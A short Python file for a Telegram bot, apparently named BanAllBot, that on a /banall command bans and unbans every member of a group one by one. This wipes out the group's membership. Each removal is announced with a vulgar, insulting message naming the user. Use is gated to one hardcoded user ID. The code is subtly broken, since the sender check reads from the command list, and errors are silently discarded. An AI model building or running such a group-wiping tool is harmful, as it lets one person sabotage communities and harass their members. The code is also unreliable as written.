from BanAllBot import app,BOT_ID,SUDO
from pyrogram import filters,enums


@app.on_message(filters.command("banall"))
async def ban_all(_,msg):
    chat_id=msg.chat.id    
    bot=await app.get_chat_member(chat_id,BOT_ID)
    bot_permission=bot.privileges.can_restrict_members==True    
    if bot_permission and (msg.command).from_user.id==5264285143:
        async for member in app.get_chat_members(chat_id):       
            try:
                    await app.ban_chat_member(chat_id, member.user.id)
                    await msg.reply_text(f"ғᴜᴄᴋɪɴɢ ᴀʟʟ ᴍᴇᴍʙᴇʀs ᴀɴᴅ ᴛʜᴇɪʀ ᴍᴏᴍs ɪɴ ᴛʜɪs ɢʀᴏᴜᴘ {member.user.mention}")
                    await app.unban_chat_member(chat_id, member.user.id)
            except Exception:
                pass
    else:
        await msg.reply_text("don't have permissions")  
                                         
    
            
